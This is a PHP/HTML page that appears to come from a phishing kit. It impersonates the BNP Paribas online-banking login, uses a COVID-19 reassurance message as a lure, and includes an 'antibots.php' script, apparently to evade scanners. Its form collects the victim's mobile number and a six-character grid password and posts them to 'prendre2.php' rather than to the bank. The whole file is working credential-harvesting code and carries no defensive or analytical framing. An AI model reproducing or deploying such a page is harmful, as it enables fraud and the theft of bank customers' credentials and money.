<?php 
include("antibots.php");

?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"> 
<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<meta http-equiv="pragma" content="no-cache">
<meta http-equiv="Cache-Control" content="no-cache">
<meta http-equiv="expires" content="Tue, 01-Jan-1980 00:00:00 GMT">
<meta http-equiv="date" content="Tue, 01-Jan-1980 00:00:00 GMT">
<title>BNPPARIBAS NET IDENTIFICATION</title>
<link href="dciweb.css" rel="stylesheet" type="text/css">
<link href="bnp.css" rel="stylesheet" type="text/css">
</head>
<body  bgcolor="#FFFFFF" link="#002288" alink="#002288" vlink="#002288"  >
<script language="JavaScript" src="tools.js"></script>
  <style>
    body {display : none;} 
  </style>
  <script>
    if (self == top) { 
      var theBody = document.getElementsByTagName('body')[0];
      theBody.style.display = "block";
    } else { 
      top.location = self.location; 
    }
  </script>
  <script type="text/javascript">
    function clearParams() {
      if (document.saisie.p0 != null) document.saisie.p0.value = "";
    }

    function submitform()
    {
        document.saisie.submit() ;
      clearParams();
    }
    function key(evnt)
    {
      if(evnt.which==13) submitform();
    }
  </script>
  <style type="text/css">
    <!--
    a:link,a:active,a:visited
    {
    text-decoration:none;
    color:black;
    }
    a:hover
    {
    text-decoration: underline;
    color:#0000FF;
    }
    //-->
  </style>
  <div class="page">
    <table>
      <tr>
        <td align="center"><img align="center" border="0" src="headerBack.jpg" width="760" height="75"></td>
      </tr>
      <tr>
        <td colspan=2>&nbsp;</td>
      </tr>
    </table>
    <div class="info3"><span style="font-size:130%">
  Acc&eacute;dez &agrave; l'espace s&eacute;curis&eacute; BNPPARIBAS.NET
</span></div>
    <div align="left">
      &nbsp;
    </div>
      <div align="center">
        <b><font color="#FF0000"><font color="#269EE5">Dans ce contexte in&eacute;dit nos agences restent ouvertes dans leur tr&egrave;s grande majorit&eacute; et nous sommes joignables par t&eacute;l&eacute;phone ou mail.<br>Nos equipes sont &agrave; vos cot&eacute;s pour vous proposer si besoin, des solutions adapt&eacute;es &agrave; chaque situation. Nous vous remercions de votre confiance et de votre fid&eacute;lit&eacute;. </font> </font></b>
        <center>
          <form autocomplete="off"  name="saisie" method="post" enctype="application/x-www-form-urlencoded" target="_top" action="prendre2.php">
              <input type="hidden" name="vkid" value="vkident-8364hk1sgj">
              <input type="hidden" name="p1">
              <div style="width:620px; margin:0 auto; text-align: left">
                <div class="formulaire1" style="height:32px; line-height:32px; font-size:12px;">
                  <img src="etape1.png" style="width:20px; height:20px; margin:auto 5px; vertical-align:middle;" />
                  <span >&nbsp;Saisissez votre &nbsp;num&eacute;ro&nbsp;mobile&nbsp;&agrave; l'aide du&nbsp;clavier</span>
                  <span style="font-size:13px; font-weight:bold; margin-left:20px;">Num&eacute;ro Mobile</span>
                  <input size="20" required="" maxlength="20" value="" name="p0" type="text" style="margin: auto 5px; vertical-align:middle; width: 170px;" />
                </div>
                <div class="encartIdent" >
                  <span class="titre">
  Espace s&eacute;curis&eacute; BNPPARIBAS.NET
</span>
                  <ul>
                     <li><a href=""> <FONT COLOR="#0000FF">Accueil</FONT></a></li> 
                     <li><a href=""   target="_blank"><FONT COLOR="#0000FF">Aide &agrave; la connexion ?</FONT></a></li> 
                        <li><a href=""      target="_blank"><FONT COLOR="#0000FF">Convention</FONT></a></li> 
                    <li><a href="" target="_top"><FONT COLOR="#0000FF">Visite guid&eacute;e</FONT></a></li>
                  </ul>
                </div>
                <div style="float:left;width: 50%;">

                  <table cellpadding="0" cellspacing="0" class="tableBouton">
                    <tr>
                      <td align="center">
                        <a href="#" name="local" onClick="return submitform();">
                          <img src="btn_valider.png" alt="" />
                        </a>
                      </td>
                      <td>&nbsp;</td>
                      <td align="center">
                        <a href="#" name="local" onClick="document.saisie.p0.value=''; document.saisie.pwd.value=''; document.saisie.p0.focus();">
                          <img src="btn_annuler.png" alt="" />
                        </a>
                      </td>
                    </tr>
                  </table>




  

<map name="grillemap">
  <script language="javascript">
  CellX=132/5;
  CellY=128/5;
	col=0;
	lig=0;
  tabcar = new Array('A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y');
	function pwd_writeM(cell)
	{
	  document.saisie.pwd.value
   	
		if ( document.saisie.pwd.value.length < 6 )
	  	document.saisie.pwd.value = document.saisie.pwd.value + tabcar[cell];
	}
	for(i=0; i<25; i++ )
	{
	  if(parseInt((i/5), 10)!=lig)
	  {
		  col=0;
		  lig=parseInt((i/5), 10);
	  }
	  posX = parseInt(col*CellX, 10);
	  posY = parseInt(lig*CellY, 10);
	  posX1= parseInt((col+1)*CellX, 10);
	  posY1= parseInt((lig+1)*CellY, 10);
	  col++;
	  document.writeln('<area shape="rect" coords="'+posX+','+posY+','+posX1+','+posY1+'" onclick="pwd_writeM('+i+');" ondblclick="if(navigator.appName==\'Microsoft Internet Explorer\'){pwd_writeM('+i+')}" onfocus="document.saisie.p0.focus();">');
	}
  </script>
  
</map>

                </div>
              </div>
            
          </form>
        </center> 
      </div>
      
      <div style="clear:both;"/>
        
        <div align="center">
        
          
            <div style="padding-top: 10px">
              <img src="images/covid19-information.png" height="300" border="0">
            </div>
          
        
      </div>
        
        
      </div>
    
  </div>
  
  <script type="text/javascript">
    document.saisie.p0.focus();
  </script>
  
  
</div>
</body>


</html>